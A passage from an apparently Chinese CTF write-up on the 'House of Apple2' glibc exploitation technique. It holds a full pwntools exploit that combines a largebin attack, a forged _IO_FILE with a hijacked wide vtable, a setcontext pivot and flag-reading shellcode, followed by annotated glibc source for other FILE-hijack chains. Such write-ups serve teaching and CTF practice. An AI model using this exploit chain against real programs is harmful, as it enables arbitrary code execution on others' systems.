<p>也就是如下面这3部分的构造。由于我们最后是call到C这里，所以不能直接执行shellcode。我们可以通过setcontext来将rsp放到目标位置，然后setcontext中间会push一个rcx，所以我们可以连带着rcx设置为目标shellcode位置，最后ret到rcx指向的地址，也就执行了我们事先布置的shellcode了。这里rdx就是我们之前布置的<code>_wide_data</code>的位置，然后我们在不影响原来_IO_FILE利用时，设置对应偏移字段来达成特定寄存器的赋值。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span>-<span class="number">0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109235637786.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109235847848.png"
                      class=""
                >
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">table = <span class="string">&quot;polikujmyhntgbrfvedcwsxqazQWERTYUIOPASDFGHJKLZXCVBNM)!@#$%^&amp;*(+/&quot;</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">glibc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">name = <span class="string">b&quot;a&quot;</span>*<span class="number">8</span> + p32(<span class="number">0x88888888</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;dear:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">0x88888888</span>)</span><br><span class="line">wolf = libc.rand()</span><br><span class="line">sword = libc.rand()</span><br><span class="line">log.success(<span class="string">&quot;wolf:&quot;</span>+<span class="built_in">str</span>(wolf)+<span class="string">&quot;  sword:&quot;</span>+<span class="built_in">str</span>(sword))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Lion is &quot;</span>)</span><br><span class="line">lion = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;Lion:&quot;</span>+<span class="built_in">str</span>(lion))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Snake is &quot;</span>)</span><br><span class="line">snake = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">log.success(<span class="string">&quot;snake:&quot;</span>+<span class="built_in">str</span>(snake))</span><br><span class="line"></span><br><span class="line">setvbuf_add = lion ^ wolf ^ libc.rand()</span><br><span class="line">libc_base = setvbuf_add - glibc.sym[<span class="string">&quot;setvbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">v0 = snake ^ libc.rand()</span><br><span class="line">fortune = v0 ^ sword</span><br><span class="line">log.success(<span class="string">&quot;fortune:&quot;</span>+<span class="built_in">hex</span>(fortune))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>=libc_base+glibc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + glibc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + glibc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">stderr=libc_base+glibc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">_IO_list_all=libc_base+glibc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">setcontext=libc_base + glibc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps =libc_base+glibc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>():</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x528</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x518</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x550</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">log.success(<span class="string">&quot;_io_list_all:&quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(_IO_list_all-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">sub rdi,100</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">mov rdx,rsp</span></span><br><span class="line"><span class="string">mov rsi, 0x67616c662f</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">add rdx,0x100</span></span><br><span class="line"><span class="string">mov r10,0x18</span></span><br><span class="line"><span class="string">mov rax,0x1b5</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 3</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">mov rdx, rsp</span></span><br><span class="line"><span class="string">mov r10, 0x100</span></span><br><span class="line"><span class="string">push SYS_sendfile</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_IO_FILE  = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) <span class="comment">#_write_base,_write_ptr</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(<span class="number">0</span>) <span class="comment">#_IO_buf_base,_IO_buf_end </span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_save_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      <span class="comment">#_IO_backup_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)       <span class="comment">#_lock</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x18</span>)    <span class="comment">#_wide_data</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)            <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)       <span class="comment">#setcontext-&gt;rsp</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)     <span class="comment">#setcontext-&gt;rcx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span>-<span class="number">0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">passwd = <span class="string">&quot;74r0t#C@rd&quot;</span></span><br><span class="line">out()</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.sendline(fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment"># p.sendline(b&quot;2&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h5 id="2-IO-wfile-underflow-mmap链"><a href="#2-IO-wfile-underflow-mmap链" class="headerlink" title="2._IO_wfile_underflow_mmap链"></a>2._IO_wfile_underflow_mmap链</h5><p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">		      fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">		      &amp;read_stop,</span><br><span class="line">		      fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">		      fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">		      &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_read_ptr = (<span class="type">char</span> *) read_stop;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we managed to generate some text return the next character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There is some garbage at the end of the file.  */</span></span><br><span class="line">  __set_errno (EILSEQ);</span><br><span class="line">  fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">  <span class="keyword">return</span> WEOF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mmap_remap_check (fp)))</span><br><span class="line">    <span class="comment">/* We punted to the regular file functions.  */</span></span><br><span class="line">    <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>需满足的条件如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags &amp; _IO_NO_READS == <span class="number">0</span>;</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end == <span class="literal">false</span>;</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>;</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_save_base == <span class="literal">NULL</span>;	<span class="comment">//也可以不为null，但要执行一次free和flag的设置，最好设置为0</span></span><br></pre></td></tr></table></figure></div>
<p>实质上就是进入的点不同，最后利用的链还是相同的。这里如果只是单纯的把虚表从<code>_IO_wfile_jumps</code>改成<code>_IO_wfile_jumps_mmap</code>，实际最后还是会进入overflow那个函数。因为这两个虚表其实是完全相同的，而我们触发的是原来表中overflow那个虚表函数。我们需要添加偏移来进入不同的函数，在本题中，经测试+0x10的偏移能够进入<code>_IO_wdefault_uflow</code>，偏移+0x30能进入<code>_IO_wfile_seekoff</code>，+8偏移能成功进入<code>_IO_wfile_underflow_mmap</code>，其实就是对应原表的偏移。</p>
<p>构造如下</p>
<ul>
<li><code>_flags</code> = <code>~4</code></li>
<li><code>vtable</code> 设置为 <code>_IO_wfile_jumps_mmap</code> 地址（加减偏移）</li>
<li><code>_IO_read_end &gt; _IO_read_ptr</code>（不进入调用）</li>
<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>（即满足<code>*A&gt;=*(A+8)</code>）</li>
<li><code>_wide_data-&gt;_IO_buf_base</code> = <code>0</code>（即满足<code>*(A+0x30)=0</code>）</li>
<li><code>_wide_data-&gt;_IO_save_base</code> = <code>0</code>（即满足<code>*(A+0x40)=0</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> = 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足<code>*(B+0x68)=C</code>）</li>
</ul>
<p>但这里rdx进去不是可控地址，看上去是把我们处在第二个字段<code>_IO_read_ptr</code>的largebin chunk size给赋值过来了。这就为setcontext赋值增加了难度，所以这一题不用这个方法。我们能成功的到这一步其实已经算是成功的利用了这条链条。可以尝试call到别的地方打。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241110011234406.png"
                      class=""
                >
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">fake_IO_FILE  = p64(<span class="number">0x1000</span>)   #read_end</span><br><span class="line">fake_IO_FILE += p64(<span class="number">3</span>)          #read_base</span><br><span class="line">fake_IO_FILE += p64(<span class="number">20</span>) + p64(<span class="number">22</span>) #_write_base,_write_ptr</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(<span class="number">0</span>) #_IO_buf_base,_IO_buf_end </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      #_IO_save_base</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      #_IO_backup_base</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)      #_IO_save_end</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)       #_lock</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x18</span>)    #_wide_data</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)            # _mode = <span class="number">0</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)       <span class="meta">#setcontext-&gt;rsp</span></span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x108</span>)     <span class="meta">#setcontext-&gt;rcx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps_mmap+<span class="number">0x8</span>)  <span class="meta"># vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xf8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fortune+<span class="number">0x100</span><span class="number">-0x68</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x100</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>) + shellcode</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h5 id="3-IO-wdefault-xsgetn链"><a href="#3-IO-wdefault-xsgetn链" class="headerlink" title="3. _IO_wdefault_xsgetn链"></a>3. _IO_wdefault_xsgetn链</h5><p>源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_in_put_mode(_fp) ((_fp)-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_wdefault_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="type">wchar_t</span> *s = (<span class="type">wchar_t</span>*) data;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Data available. */</span></span><br><span class="line">      <span class="type">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> ((<span class="type">size_t</span>) count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	    count = <span class="number">0</span>;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">	      <span class="type">int</span> i = (<span class="type">int</span>) count;</span><br><span class="line">	      <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">		*s++ = *p++;</span><br><span class="line">	      fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">wint_t</span></span><br><span class="line">__wunderflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_wget_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_wbackup (fp, fp-&gt;_wide_data-&gt;_IO_read_end))</span><br><span class="line">	<span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_wbackup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">	fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>目的是进到<code>__wunderflow (fp)</code>中<code>_IO_switch_to_wget_mode</code>里的<code>(wint_t)_IO_WOVERFLOW (fp, WEOF)</code>这个虚表函数调用。</p>
<p>需要满足条件如下</p>
